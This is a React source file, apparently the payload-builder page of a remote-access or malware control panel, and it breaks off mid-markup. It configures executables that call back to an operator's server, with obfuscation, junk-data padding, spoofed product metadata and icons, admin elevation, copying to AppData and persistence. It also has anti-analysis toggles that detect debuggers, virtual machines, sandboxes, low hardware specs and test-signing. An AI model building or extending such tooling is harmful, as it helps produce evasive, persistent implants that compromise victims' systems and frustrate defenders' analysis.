import { useState, useMemo, useRef, useEffect, useCallback } from 'react';
import { useTranslation } from 'react-i18next';
import { Button, Card, Input, Label, Modal, Popover, Slider, Spinner, Switch, Tabs, TextField } from '@heroui/react';
import { NumberField } from '@heroui/react/number-field';
import { ListView } from '@components/list-view';
import type { Selection } from 'react-aria-components';
import { startBuild, uploadIcon, getBuildStreamUrl, listBuilds, deleteBuild, getBuildDownloadUrl, getBuildInfo, listTemplates, uploadTemplate, deleteTemplate } from '../../api/build';
import type { BuildConfigRequest, BuildRecord, BuildRecordDetail, TemplateInfo } from '../../types/models';
import { ArrowDownToLine, CircleCheck, CircleInfo, Picture, Shield, TrashBin } from '@gravity-ui/icons';

interface ToggleOption {
  id: string;
  key: keyof BuildConfigRequest;
}

interface AntiAnalysisToggle {
  id: string;
  key: keyof BuildConfigRequest['antiAnalysis'];
}

const DEFAULT_CONFIG: BuildConfigRequest = {
  platform: 'x64',
  applicationType: 'Console',
  serverHost: '127.0.0.1',
  serverPort: 5270,
  enableObfuscation: false,
  injectJunkData: false,
  junkDataMb: 10,
  iconUrl: '',
  companyName: '',
  fileDescription: '',
  productName: '',
  copyright: '',
  fileVersion: '',
  stripSymbols: true,
  requireAdmin: false,
  copyToAppData: false,
  enablePersistence: false,
  antiAnalysis: {
    enabled: false,
    checkCpuCores: true,
    minCpuCores: 2,
    checkMemory: true,
    minMemoryGb: 2,
    checkDiskSize: true,
    minDiskGb: 60,
    checkDebugger: true,
    checkVmMac: true,
    checkUsername: true,
    checkUsbHistory: true,
    minUsbDevices: 2,
    checkTestSigning: true,
    checkDelaySandbox: true,
    delaySeconds: 5,
  },
};

const STATUS_LABEL: Record<string, string> = {
  building: 'builder.buildingStatus',
  completed: 'builder.completed',
  failed: 'builder.failed',
};

const PLATFORM_LABEL: Record<string, string> = {
  x64: 'x64',
  x86: 'x86',
  arm: 'ARM',
};

const APP_TYPE_LABEL: Record<string, string> = {
  Console: 'builder.consoleApp',
  Desktop: 'builder.desktopApp',
};

export default function BuilderPage() {
  const { t } = useTranslation();
  const [config, setConfig] = useState<BuildConfigRequest>({ ...DEFAULT_CONFIG });
  const [building, setBuilding] = useState(false);
  const [buildId, setBuildId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [iconUploading, setIconUploading] = useState(false);
  const [iconFileName, setIconFileName] = useState<string | null>(null);
  const [iconPreview, setIconPreview] = useState<string | null>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [buildStatus, setBuildStatus] = useState<string | null>(null);
  const [buildSucceeded, setBuildSucceeded] = useState(false);
  const [elapsed, setElapsed] = useState(0);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const lastBuildResultRef = useRef<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const logEndRef = useRef<HTMLDivElement>(null);
  const esRef = useRef<EventSource | null>(null);

  // History
  const [history, setHistory] = useState<BuildRecord[]>([]);
  const [historyLoading, setHistoryLoading] = useState(false);
  const [selectedRecord, setSelectedRecord] = useState<BuildRecordDetail | null>(null);
  const [infoLoading, setInfoLoading] = useState(false);

  // Templates
  const [templates, setTemplates] = useState<TemplateInfo[]>([]);
  const [templateUploading, setTemplateUploading] = useState(false);
  const templateFileRef = useRef<HTMLInputElement>(null);

  const loadHistory = useCallback(async () => {
    try {
      const items = await listBuilds();
      setHistory(items);
    } catch { /* ignore */ }
  }, []);

  const loadTemplates = useCallback(async () => {
    try {
      const items = await listTemplates();
      setTemplates(Array.isArray(items) ? items : []);
    } catch { /* ignore */ }
  }, []);

  useEffect(() => { loadHistory(); loadTemplates(); }, [loadHistory, loadTemplates]);

  const set = <K extends keyof BuildConfigRequest>(key: K, value: BuildConfigRequest[K]) =>
    setConfig((c) => ({ ...c, [key]: value }));

  const buildOptions: ToggleOption[] = useMemo(() => [
    { id: 'stripSymbols', key: 'stripSymbols' },
    { id: 'enableObfuscation', key: 'enableObfuscation' },
    { id: 'injectJunkData', key: 'injectJunkData' },
  ], []);

  const persistenceOptions: ToggleOption[] = useMemo(() => [
    { id: 'requireAdmin', key: 'requireAdmin' },
    { id: 'copyToAppData', key: 'copyToAppData' },
    { id: 'enablePersistence', key: 'enablePersistence' },
  ], []);

  const antiAnalysisOptions: AntiAnalysisToggle[] = useMemo(() => [
    { id: 'checkCpuCores', key: 'checkCpuCores' },
    { id: 'checkMemory', key: 'checkMemory' },
    { id: 'checkDiskSize', key: 'checkDiskSize' },
    { id: 'checkUsbHistory', key: 'checkUsbHistory' },
    { id: 'checkDelaySandbox', key: 'checkDelaySandbox' },
    { id: 'checkDebugger', key: 'checkDebugger' },
    { id: 'checkVmMac', key: 'checkVmMac' },
    { id: 'checkUsername', key: 'checkUsername' },
    { id: 'checkTestSigning', key: 'checkTestSigning' },
  ], []);

  const selectedBuildKeys = useMemo(
    () => new Set(buildOptions.filter((o) => !!config[o.key]).map((o) => o.id)),
    [config.stripSymbols, config.enableObfuscation, config.injectJunkData],
  );

  const selectedPersistenceKeys = useMemo(
    () => new Set(persistenceOptions.filter((o) => !!config[o.key]).map((o) => o.id)),
    [config.requireAdmin, config.copyToAppData, config.enablePersistence],
  );

  const selectedAntiAnalysisKeys = useMemo(
    () => new Set(antiAnalysisOptions.filter((o) => !!config.antiAnalysis[o.key]).map((o) => o.id)),
    [config.antiAnalysis],
  );

  const handleBuildSelectionChange = (keys: Selection) => {
    const s = keys as Set<string>;
    for (const opt of buildOptions) {
      set(opt.key, (s.has(opt.id) ? true : false) as BuildConfigRequest[typeof opt.key]);
    }
  };

  const handlePersistenceSelectionChange = (keys: Selection) => {
    const s = keys as Set<string>;
    for (const opt of persistenceOptions) {
      set(opt.key, (s.has(opt.id) ? true : false) as BuildConfigRequest[typeof opt.key]);
    }
  };

  const handleAntiAnalysisSelectionChange = (keys: Selection) => {
    const s = keys as Set<string>;
    const updated = { ...config.antiAnalysis };
    for (const opt of antiAnalysisOptions) {
      (updated as any)[opt.key] = s.has(opt.id);
    }
    setConfig((c) => ({ ...c, antiAnalysis: updated }));
  };

  const toggleAntiAnalysis = () => {
    setConfig((c) => ({ ...c, antiAnalysis: { ...c.antiAnalysis, enabled: !c.antiAnalysis.enabled } }));
  };

  const setAntiAnalysis = <K extends keyof BuildConfigRequest['antiAnalysis']>(key: K, value: BuildConfigRequest['antiAnalysis'][K]) => {
    setConfig((c) => ({ ...c, antiAnalysis: { ...c.antiAnalysis, [key]: value } }));
  };

  const handleIconUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setIconUploading(true);
    setIconFileName(file.name);
    // Create local preview
    const previewUrl = URL.createObjectURL(file);
    if (iconPreview) URL.revokeObjectURL(iconPreview);
    setIconPreview(previewUrl);
    try {
      const path = await uploadIcon(file);
      set('iconUrl', path);
    } catch {
      setIconFileName(null);
      setIconPreview(null);
    } finally {
      setIconUploading(false);
    }
  };

  const handleTemplateUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setTemplateUploading(true);
    try {
      await uploadTemplate(file, config.platform);
      await loadTemplates();
    } catch { /* ignore */ }
    finally { setTemplateUploading(false); }
    if (templateFileRef.current) templateFileRef.current.value = '';
  };

  const handleDeleteTemplate = async (platform: string) => {
    if (!confirm(t('builder.deleteTemplateConfirm'))) return;
    try {
      await deleteTemplate(platform);
      await loadTemplates();
    } catch { /* ignore */ }
  };

  const handleRebuildFromTemplate = (platform: string) => {
    setConfig((c) => ({ ...c, platform }));
    setTimeout(() => handleBuild(), 0);
  };

  const handleBuild = async () => {
    setBuilding(true);
    setError(null);
    setLogs([]);
    setElapsed(0);
    setBuildStatus('builder.preparing');
    setBuildId(null);
    setBuildSucceeded(false);
    lastBuildResultRef.current = null;

    // Start timer
    const startTime = Date.now();
    timerRef.current = setInterval(() => {
      setElapsed(Math.floor((Date.now() - startTime) / 1000));
    }, 200);

    try {
      const id = await startBuild(config);
      setBuildId(id);
      setBuildStatus('builder.buildingStatus');

      // Close any existing SSE connection
      if (esRef.current) esRef.current.close();

      const url = getBuildStreamUrl(id);
      const es = new EventSource(url);
      esRef.current = es;

      es.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data);
          switch (msg.type) {
            case 'log':
              setLogs((prev) => [...prev, msg.text]);
              break;
            case 'status':
              lastBuildResultRef.current = msg.status;
              setBuildStatus(msg.status === 'completed' ? 'builder.completed' : 'builder.failed');
              if (msg.status === 'failed' && msg.error) {
                setError(msg.error);
              }
              break;
            case 'done':
              es.close();
              esRef.current = null;
              if (lastBuildResultRef.current === 'completed') {
                setBuildSucceeded(true);
              }
              setBuilding(false);
              if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
              loadHistory();
              break;
            case 'error':
              setError(msg.message || 'Stream error');
              es.close();
              esRef.current = null;
              setBuilding(false);
              if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
              break;
          }
        } catch { /* parse error */ }
      };

      es.onerror = () => {
        es.close();
        esRef.current = null;
        setBuilding(false);
        if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
        if (logs.length === 0) {
          setError('Failed to connect to build log stream.');
        }
      };
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
      setBuilding(false);
      if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
    }
  };

  // Auto-scroll logs
  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      esRef.current?.close();
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  const handleOpenInfo = async (id: string) => {
    setInfoLoading(true);
    try {
      const detail = await getBuildInfo(id);
      setSelectedRecord(detail);
    } catch { /* ignore */ } finally {
      setInfoLoading(false);
    }
  };

  const handleDownload = (id: string) => {
    window.open(getBuildDownloadUrl(id), '_blank');
  };

  const handleDelete = async (id: string) => {
    try {
      setHistoryLoading(true);
      await deleteBuild(id);
      await loadHistory();
    } catch { /* ignore */ } finally {
      setHistoryLoading(false);
    }
  };

  const formatElapsed = (s: number): string => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2, '0')}`;
  };

  const formatSize = (bytes: number): string => {
    if (bytes === 0) return '-';
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
    return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
  };

  const formatDate = (iso: string): string => {
    if (!iso) return '-';
    const d = new Date(iso);
    return d.toLocaleString();
  };

  return (
    <div className="flex flex-col lg:flex-row gap-4 max-w-6xl mx-auto items-start">
      {/* Left: Build Config */}
      <div className="flex-1 space-y-4">
        {/* Connection + Metadata */}
        <Card className="p-4">
          <h2 className="text-lg font-semibold mb-3">{t('builder.connection')}</h2>
          <div className="grid grid-cols-2 lg:grid-cols-3 gap-4">
            <TextField
              className="col-span-2"
              value={config.serverHost}
              onChange={(v) => set('serverHost', v)}
            >
              <Label>{t('builder.serverHost')}</Label>
              <Input placeholder="127.0.0.1" />
            </TextField>
            <NumberField
              className="w-full max-w-64"
              value={config.serverPort}
              minValue={1}
              maxValue={65535}
              onChange={(v) => set('serverPort', v)}
            >
              <Label>{t('builder.serverPort')}</Label>
              <NumberField.Group>
                <NumberField.DecrementButton />
                <NumberField.Input className="w-[120px]" />
                <NumberField.IncrementButton />
              </NumberField.Group>
            </NumberField>
          </div>
          <hr className="my-4 border-default-200" />
          <h2 className="text-lg font-semibold mb-3">{t('builder.metadata')}</h2>
          <div className="grid grid-cols-2 lg:grid-cols-3 gap-3">
            <TextField
              value={config.productName || ''}
              onChange={(v) => set('productName', v || undefined)}
            >
              <Label>{t('builder.productName')}</Label>
              <Input />
            </TextField>
            <TextField
              value={config.fileDescription || ''}
              onChange={(v) => set('fileDescription', v || undefined)}
            >
              <Label>{t('builder.fileDescription')}</Label>
              <Input />
            </TextField>
            <TextField
              value={config.companyName || ''}
              onChange={(v) => set('companyName', v || undefined)}
            >
              <Label>{t('builder.companyName')}</Label>
              <Input />
            </TextField>
            <TextField
              value={config.copyright || ''}
              onChange={(v) => set('copyright', v || undefined)}
            >
              <Label>{t('builder.copyright')}</Label>
              <Input />
            </TextField>
            <TextField
              value={config.fileVersion || ''}
              onChange={(v) => set('fileVersion', v || undefined)}
            >
              <Label>{t('builder.fileVersion')}</Label>
              <Input placeholder="1.0.0.0" />
            </TextField>
            <div className="space-y-2">
              <Label>{t('builder.icon')}</Label>
              <div className="flex items-center gap-3">
                <input
                  title={t('builder.iconUpload')}
                  ref={fileInputRef}
                  type="file"
                  accept=".ico"
                  className="hidden"
                  onChange={handleIconUpload}
                />
                <div
                  className="relative shrink-0 w-10 h-10 border-2 border-dashed border-default-300 rounded-lg flex items-center justify-center cursor-pointer hover:border-primary-400 transition-colors overflow-hidden"
                  role="button"
                  tabIndex={0}
                  aria-label={t('builder.iconUpload')}
                  onClick={() => fileInputRef.current?.click()}
                  onKeyDown={(e) => { if (e.key === 'Enter' || e.key === ' ') fileInputRef.current?.click(); }}
                >
                  {iconUploading ? (
                    <Spinner />
                  ) : iconPreview ? (
                    <img src={iconPreview} alt="icon" className="w-full h-full object-contain p-0.5" />
                  ) : (
                    <Picture />
                  )}
                </div>
                <TextField
                  className="flex-1 w-[80%]"
                  value={config.iconUrl || ''}
                  onChange={(v) => set('iconUrl', v || undefined)}
                >
                  <Input placeholder="https://example.com/icon.ico" />
                </TextField>
              </div>
            </div>
          </div>
        </Card>

        {/* Platform + Application Type */}
        <Card className="p-4">
          <div className="grid grid-cols-2 gap-6">
            <div>
              <h2 className="text-lg font-semibold mb-3">{t('builder.platform')}</h2>
              <Tabs
                selectedKey={config.platform}
                onSelectionChange={(key) => set('platform', String(key))}
              >
                <Tabs.List>
                  <Tabs.Tab id="x64">x64<Tabs.Indicator /></Tabs.Tab>
                  <Tabs.Tab id="x86">x86<Tabs.Indicator /></Tabs.Tab>
                  <Tabs.Tab id="arm">ARM<Tabs.Indicator /></Tabs.Tab>
                </Tabs.List>
              </Tabs>
            </div>
            <div>
              <h2 className="text-lg font-semibold mb-3">{t('builder.applicationType')}</h2>
              <Tabs
                selectedKey={config.applicationType}
                onSelectionChange={(key) => set('applicationType', String(key))}
              >
                <Tabs.List>
                  <Tabs.Tab id="Console">{t('builder.consoleApp')}<Tabs.Indicator /></Tabs.Tab>
                  <Tabs.Tab id="Desktop">{t('builder.desktopApp')}<Tabs.Indicator /></Tabs.Tab>
                </Tabs.List>
              </Tabs>
              <p className="text-xs text-default-500 mt-2">
                {t(config.applicationType === 'Desktop' ? 'builder.desktopAppDesc' : 'builder.consoleAppDesc')}
              </p>
            </div>
          </div>
        </Card>

        {/* Build options + Persistence */}
        <div className="grid grid-cols-2 gap-4">
          <Card className="p-4">
            <h2 className="text-lg font-semibold mb-3">{t('builder.buildOptions')}</h2>
            <ListView
              aria-label={t('builder.buildOptions')}
              items={buildOptions}
              selectedKeys={selectedBuildKeys}
              selectionMode="multiple"
              variant="primary"
              onSelectionChange={handleBuildSelectionChange}
            >
              {(opt) => (
                <ListView.Item id={opt.id} textValue={t(`builder.${opt.id}`)}>
                  <ListView.ItemContent>
                    <div className="flex items-center justify-between w-full">
                      <ListView.Title>{t(`builder.${opt.id}`)}</ListView.Title>
                      <Popover >
                        <Button isIconOnly variant="ghost" className=" h-8 w-8 min-w-0">
                          <CircleInfo className="h-6 w-6" />
                        </Button>
                        <Popover.Content className="max-w-64">
                          <Popover.Dialog>
                            <Popover.Heading className="text-sm">{t(`builder.${opt.id}`)}</Popover.Heading>
                            <p className="mt-1 text-xs text-default-500">{t(`builder.${opt.id}Desc`)}</p>
                          </Popover.Dialog>
                        </Popover.Content>
                      </Popover>
                    </div>
                  </ListView.ItemContent>
                </ListView.Item>
              )}
            </ListView>
            {config.injectJunkData && (
              <div className="mt-3 pl-4">
                <Slider
                  className="w-full max-w-xs"
                  value={config.junkDataMb}
                  minValue={1}
                  maxValue={200}
                  step={1}
                  onChange={(v) => set('junkDataMb', (Array.isArray(v) ? v[0] : v) ?? 10)}
                >
                  <Label>{t('builder.junkDataMb')}</Label>
                  <Slider.Output />
                  <Slider.Track>
                    <Slider.Fill />
                    <Slider.Thumb />
                  </Slider.Track>
                </Slider>
              </div>
            )}
          </Card>

          <Card className="p-4">
            <h2 className="text-lg font-semibold mb-3">{t('builder.persistence')}</h2>
            <ListView
              aria-label={t('builder.persistence')}
              items={persistenceOptions}
              selectedKeys={selectedPersistenceKeys}
              selectionMode="multiple"
              variant="primary"
              onSelectionChange={handlePersistenceSelectionChange}
            >
              {(opt) => (
                <ListView.Item id={opt.id} textValue={t(`builder.${opt.id}`)}>
                  <ListView.ItemContent>
                    <div className="flex items-center justify-between w-full">
                      <ListView.Title>{t(`builder.${opt.id}`)}</ListView.Title>
                      <Popover>
                        <Button isIconOnly variant="ghost" className=" h-8 w-8 min-w-0">
                          <CircleInfo className="h-6 w-6" />
                        </Button>
                        <Popover.Content className="max-w-64">
                          <Popover.Dialog>
                            <Popover.Heading className="text-sm">{t(`builder.${opt.id}`)}</Popover.Heading>
                            <p className="mt-1 text-xs text-default-500">{t(`builder.${opt.id}Desc`)}</p>
                          </Popover.Dialog>
                        </Popover.Content>
                      </Popover>
                    </div>
                  </ListView.ItemContent>
                </ListView.Item>
              )}
            </ListView>
          </Card>
        </div>

          <Card className="p-4">
            <div className="flex items-center justify-between mb-3">
              <h2 className="text-lg font-semibold flex items-center gap-2">
                <Shield className="w-5 h-5" />
                {t('builder.antiAnalysis')}
              </h2>
              <Switch isSelected={config.antiAnalysis.enabled} onChange={toggleAntiAnalysis}>
                <Switch.Control>
                  <Switch.Thumb />
                </Switch.Control>
              </Switch>
            </div>
            {config.antiAnalysis.enabled && (
              <div className="flex gap-4">
                <div className="flex-1 min-w-0">
                  <ListView
                    aria-label={t('builder.antiAnalysis')}
                    items={antiAnalysisOptions}
                    selectedKeys={selectedAntiAnalysisKeys}
                    selectionMode="multiple"
                    variant="primary"
                    onSelectionChange={handleAntiAnalysisSelectionChange}
                  >
                    {(opt) => (
                      <ListView.Item id={opt.id} textValue={t(`builder.${opt.id}`)}>
                        <ListView.ItemContent>
                          <div className="flex items-center justify-between w-full">
                            <ListView.Title>{t(`builder.${opt.id}`)}</ListView.Title>
                            <Popover>
                              <Button isIconOnly variant="ghost" className="h-8 w-8 min-w-0">
                                <CircleInfo className="h-6 w-6" />
                              </Button>
                              <Popover.Content className="max-w-64">
                                <Popover.Dialog>
                                  <Popover.Heading className="text-sm">{t(`builder.${opt.id}`)}</Popover.Heading>
                                  <p className="mt-1 text-xs text-default-500">{t(`builder.${opt.id}Desc`)}</p>
                                </Popover.Dialog>
                              </Popover.Content>
                            </Popover>
                          </div>
                        </ListView.ItemContent>
                      </ListView.Item>
                    )}
                  </ListView>
                </div>
                <div className="w-56 shrink-0 space-y-3 pt-1">
                  <Slider aria-label={t('builder.minCpuCores')} isDisabled={!config.antiAnalysis.checkCpuCores} className="w-full" value={config.antiAnalysis.minCpuCores} minValue={1} maxValue={16} step={1} onChange={(v) => setAntiAnalysis('minCpuCores', (Array.isArray(v) ? v[0] : v) as number)}>
                    <Label>{t('builder.minCpuCores')}</Label>
                    <Slider.Output />
                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
                  </Slider>
                  <Slider aria-label={t('builder.minMemoryGb')} isDisabled={!config.antiAnalysis.checkMemory} className="w-full" value={config.antiAnalysis.minMemoryGb} minValue={1} maxValue={32} step={1} onChange={(v) => setAntiAnalysis('minMemoryGb', (Array.isArray(v) ? v[0] : v) as number)}>
                    <Label>{t('builder.minMemoryGb')}</Label>
                    <Slider.Output />
                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
                  </Slider>
                  <Slider aria-label={t('builder.minDiskGb')} isDisabled={!config.antiAnalysis.checkDiskSize} className="w-full" value={config.antiAnalysis.minDiskGb} minValue={20} maxValue={500} step={10} onChange={(v) => setAntiAnalysis('minDiskGb', (Array.isArray(v) ? v[0] : v) as number)}>
                    <Label>{t('builder.minDiskGb')}</Label>
                    <Slider.Output />
                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
                  </Slider>
                  <Slider aria-label={t('builder.minUsbDevices')} isDisabled={!config.antiAnalysis.checkUsbHistory} className="w-full" value={config.antiAnalysis.minUsbDevices} minValue={1} maxValue={10} step={1} onChange={(v) => setAntiAnalysis('minUsbDevices', (Array.isArray(v) ? v[0] : v) as number)}>
                    <Label>{t('builder.minUsbDevices')}</Label>
                    <Slider.Output />
                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
                  </Slider>
                  <Slider aria-label={t('builder.delaySeconds')} isDisabled={!config.antiAnalysis.checkDelaySandbox} className="w-full" value={config.antiAnalysis.delaySeconds} minValue={30} maxValue={180} step={1} onChange={(v) => setAntiAnalysis('delaySeconds', (Array.isArray(v) ? v[0] : v) as number)}>
                    <Label>{t('builder.delaySeconds')}</Label>
                    <Slider.Output />
                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
                  </Slider>
                </div>
              </div>
            )}
          </Card>

      </div>

      {/* Right: Build History */}
      <div className="w-full lg:w-72 shrink-0">
        <Card className="p-4">
          <Button
            variant="primary"
            onPress={handleBuild}
            isDisabled={building}
            className="w-full mb-3"
          >
            {building && <Spinner className="mr-1 w-4 h-4" />}
            {building ? (buildStatus ? t(buildStatus) : t('builder.building')) : t('builder.generate')}
          </Button>
          {error && (
            <div className="mb-3 p-2 bg-danger-50 text-danger-700 rounded text-xs">{error}</div>
          )}
          <h2 className="text-lg font-semibold mb-3">{t('builder.history')}</h2>
          {history.length === 0 ? (
            <p className="text-sm text-default-500 py-4 text-center">{t('builder.noHistory')}</p>
          ) : (
            <ListView
              aria-label={t('builder.history')}
              items={history}
              selectionMode="none"
              variant="primary"
            >
              {(record: BuildRecord) => (
                <ListView.Item
                  id={record.id}
                  textValue={record.fileName}
                  onAction={() => handleOpenInfo(record.id)}
                >
                  <ListView.ItemContent>
                    <ListView.Title>
                      <span className="text-sm font-medium">
                        {PLATFORM_LABEL[record.platform] || record.platform}
                        {' — '}
                        <span className={record.status === 'failed' ? 'text-danger' : record.status === 'building' ? 'text-primary' : 'text-success'}>
                          {t(STATUS_LABEL[record.status] || record.status)}
                        </span>
                      </span>
                    </ListView.Title>
                    <ListView.Description>
                      <div className="text-xs space-y-0.5">
                        <div>{formatDate(record.createdAt)}</div>
                        {record.fileSize > 0 && <div>{formatSize(record.fileSize)}</div>}
                      </div>
                    </ListView.Description>
                  </ListView.ItemContent>
                  {record.status === 'completed' && (
                    <ListView.ItemAction>
                      <div className="flex gap-1">
                        <Button
                          size="sm"
                          variant="ghost"
                          isIconOnly
                          aria-label={t('builder.download')}
                          onPress={() => handleDownload(record.id)}
                        >
                          <ArrowDownToLine className="w-4 h-4" />
                        </Button>
                        <Button
                          size="sm"
                          variant="ghost"
                          isIconOnly
                          aria-label={t('builder.deleteBuild')}
                          onPress={() => handleDelete(record.id)}
                        >
                          <TrashBin className="w-4 h-4 text-danger" />
                        </Button>
                      </div>
                    </ListView.ItemAction>
                  )}
                </ListView.Item>
              )}
            </ListView>
          )}
        </Card>

        <Card className="p-4 mt-4">
          <div className="flex items-center justify-between mb-3">
            <h2 className="text-lg font-semibold">{t('builder.templates')}</h2>
            <Button
              size="sm"
              variant="ghost"
              isDisabled={templateUploading}
              onPress={() => templateFileRef.current?.click()}
            >
              {templateUploading ? <Spinner className="w-3 h-3 mr-1" /> : null}
              {t('builder.uploadTemplate')}
            </Button>
          </div>
          <input
            title={t('builder.uploadTemplate')}
            ref={templateFileRef}
            type="file"
            accept=".exe,application/octet-stream"
            className="hidden"
            onChange={handleTemplateUpload}
          />
          {templates.length === 0 ? (
            <p className="text-sm text-default-500 py-4 text-center">{t('builder.noTemplates')}</p>
          ) : (
            <ListView
              aria-label={t('builder.templates')}
              items={templates}
              selectionMode="none"
              variant="primary"
            >
              {(tpl: TemplateInfo) => (
                <ListView.Item id={tpl.platform} textValue={tpl.platform}>
                  <ListView.ItemContent>
                    <ListView.Title>
                      <span className="text-sm font-medium">{PLATFORM_LABEL[tpl.platform] || tpl.platform}</span>
                    </ListView.Title>
                    <ListView.Description>
                      <span className="text-xs">{tpl.fileName} — {formatSize(tpl.fileSize)}</span>
                    </ListView.Description>
                  </ListView.ItemContent>
                  <ListView.ItemAction>
                    <div className="flex gap-1">
                      <Button
                        size="sm"
                        variant="ghost"
                        onPress={() => handleRebuildFromTemplate(tpl.platform)}
                        isDisabled={building}
                      >
                        {t('builder.rebuildTemplate')}
                      </Button>
                      <Button
                        size="sm"
                        variant="ghost"
                        isIconOnly
                        aria-label={t('builder.deleteTemplate')}
                        onPress={() => handleDeleteTemplate(tpl.platform)}
                      >
                        <TrashBin className="w-4 h-4 text-danger" />
                      </Button>
                    </div>
                  </ListView.ItemAction>
                </ListView.Item>
              )}
            </ListView>
          )}
        </Card>
      </div>

        {/* Build Log / Success Modal */}
        <Modal.Backdrop
          isOpen={logs.length > 0 || building || buildSucceeded}
          isDismissable={!building}
          onOpenChange={(open) => { if (!open && !building) { setLogs([]); setBuildSucceeded(false); } }}
        >
          <Modal.Container size={buildSucceeded && !building ? "lg" : "cover"}>
            <Modal.Dialog>
              {!building && <Modal.CloseTrigger />}
              {buildSucceeded && !building ? (
                <>
                  <Modal.Body>
                    <div className="flex flex-col items-center py-10 gap-4">
                      <div className="w-16 h-16 rounded-full bg-green-500 flex items-center justify-center">
                        <CircleCheck className="w-10 h-10 text-white" />
                      </div>
                      <h2 className="text-2xl font-semibold">{t('builder.buildSuccess')}</h2>
                      <p className="text-default-500 text-lg">{t('builder.buildSuccessDesc', { time: formatElapsed(elapsed) })}</p>
                    </div>
                  </Modal.Body>
                  <Modal.Footer>
                    {buildId && (
                      <Button variant="primary" onPress={() => handleDownload(buildId)}>
                        {t('builder.download')}
                      </Button>
                    )}
                    <Button variant="ghost" onPress={() => { setLogs([]); setBuildSucceeded(false); }}>
                      {t('common.close')}
                    </Button>
                  </Modal.Footer>
                </>
              ) : (
                <>
                  <Modal.Header>
                    <Modal.Heading className="flex items-center gap-3">
                      {t('builder.buildLog')}
                      <span className="text-sm font-normal text-default-500 tabular-nums">
                        {formatElapsed(elapsed)}
                      </span>
                    </Modal.Heading>
                  </Modal.Header>
                  <Modal.Body>
                    <div className="bg-default-100 rounded p-3 font-mono text-xs overflow-auto">
                      {logs.map((line, i) => (
                        <div key={i} className="whitespace-pre-wrap break-all leading-5">
                          {line}
                        </div>
                      ))}
                      <div ref={logEndRef} />
                    </div>
                  </Modal.Body>
                </>
              )}
            </Modal.Dialog>
          </Modal.Container>
        </Modal.Backdrop>

        {/* Info Modal */}
        <Modal.Backdrop isOpen={!!selectedRecord} onOpenChange={() => setSelectedRecord(null)}>
          <Modal.Container size="md">
            <Modal.Dialog>
              <Modal.CloseTrigger />
              <Modal.Header>
                <Modal.Heading>{t('builder.buildInfo')}</Modal.Heading>
              </Modal.Header>
              <Modal.Body>
                {infoLoading ? (
                  <div className="flex justify-center py-8"><Spinner /></div>
                ) : selectedRecord ? (
                  <div className="space-y-4 text-sm">
                    <div className="grid grid-cols-2 gap-2">
                      <div><strong>{t('builder.platform')}:</strong> {PLATFORM_LABEL[selectedRecord.platform] || selectedRecord.platform}</div>
                      <div><strong>{t('builder.applicationType')}:</strong> {selectedRecord.config ? t(APP_TYPE_LABEL[selectedRecord.config.applicationType] || selectedRecord.config.applicationType) : '-'}</div>
                      <div><strong>{t('builder.fileSize')}:</strong> {formatSize(selectedRecord.fileSize)}</div>
                      <div><strong>{t('builder.buildTime')}:</strong> {formatDate(selectedRecord.createdAt)}</div>
                      <div>
                        <strong>Status:</strong>{' '}
                        <span className={selectedRecord.status === 'failed' ? 'text-danger' : selectedRecord.status === 'completed' ? 'text-success' : 'text-primary'}>
                          {t(STATUS_LABEL[selectedRecord.status] || selectedRecord.status)}
                        </span>
                      </div>
                    </div>
                    {selectedRecord.error && (
                      <div className="p-2 bg-danger-50 text-danger-700 rounded text-xs">{selectedRecord.error}</div>
                    )}
                    {selectedRecord.config && (
                      <>
                        <hr className="border-default-200" />
                        <div className="space-y-3">
                          <div>
                            <h4 className="font-semibold mb-1">{t('builder.connection')}</h4>
                            <div className="text-default-600">
                              {selectedRecord.config.serverHost}:{selectedRecord.config.serverPort}
                            </div>
                          </div>
                          <div>
                            <h4 className="font-semibold mb-1">{t('builder.buildOptions')}</h4>
                            <div className="text-default-600 space-y-0.5">
                              <div>{t('builder.stripSymbols')}: {selectedRecord.config.stripSymbols ? t('common.yes') : t('common.no')}</div>
                              <div>{t('builder.enableObfuscation')}: {selectedRecord.config.enableObfuscation ? t('common.yes') : t('common.no')}</div>
                              <div>{t('builder.injectJunkData')}: {selectedRecord.config.injectJunkData ? `${t('common.yes')} (${selectedRecord.config.junkDataMb} MB)` : t('common.no')}</div>
                            </div>
                          </div>
                          <div>
                            <h4 className="font-semibold mb-1">{t('builder.persistence')}</h4>
                            <div className="text-default-600 space-y-0.5">
                              <div>{t('builder.requireAdmin')}: {selectedRecord.config.requireAdmin ? t('common.yes') : t('common.no')}</div>
                              <div>{t('builder.copyToAppData')}: {selectedRecord.config.copyToAppData ? t('common.yes') : t('common.no')}</div>
                              <div>{t('builder.enablePersistence')}: {selectedRecord.config.enablePersistence ? t('common.yes') : t('common.no')}</div>
                            </div>
                          </div>
                          {(selectedRecord.config.companyName || selectedRecord.config.fileDescription || selectedRecord.config.productName || selectedRecord.config.copyright || selectedRecord.config.fileVersion || selectedRecord.config.iconUrl) && (
